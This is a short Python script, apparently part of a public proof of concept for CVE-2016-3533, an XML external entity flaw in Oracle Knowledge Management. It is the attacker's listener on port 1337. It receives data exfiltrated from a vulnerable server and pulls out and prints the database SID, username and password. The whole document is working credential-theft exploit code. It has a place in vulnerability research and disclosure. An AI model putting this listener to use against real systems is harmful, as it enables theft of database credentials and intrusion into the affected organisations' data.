#!/usr/bin/python
# Oracle Knowledge Management Castor Library XML External Entity Injection Information Disclosure Vulnerability
# Found by Steven Seeley of Source Incite
# CVE: CVE-2016-3533
# SRC: SRC-2016-23
# Notes:
# - This code just listens for client requests on port 1337
# - it looks for database authentication strings and prints them out

import socket
import sys
import re

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('0.0.0.0', 1337)
print >>sys.stderr, 'starting up on %s port %s' % server_address


sock.bind(server_address)
# Listen for incoming connections
sock.listen(1)

while True:
    # Wait for a connection
    print >>sys.stderr, 'waiting for a connection'
    connection, client_address = sock.accept()
    try:
        print >>sys.stderr, 'connection from', client_address

        # Receive the data in small chunks and retransmit it
        while True:
            data = connection.recv(2048)
            
            if data:
                matchuser = re.search("<user>(.*)</user>", data)
                matchpassword = re.search("<password>(.*)</password>", data)
                matchurl = re.search("<url>(.*)</url>", data)
                if matchuser and matchpassword and matchurl:
                    print "(+) The database SID is: %s" % matchurl.group(1)
                    print "(+) The database username is: %s" % matchuser.group(1)
                    print "(+) The database password is: %s" % matchpassword.group(1)
                    connection.close()
                    sys.exit(1)
                connection.close()
                sys.exit(1)
            else:
                print >>sys.stderr, 'no more data from', client_address
                break
            
    except Exception:
        connection.close()
    finally:
        connection.close()
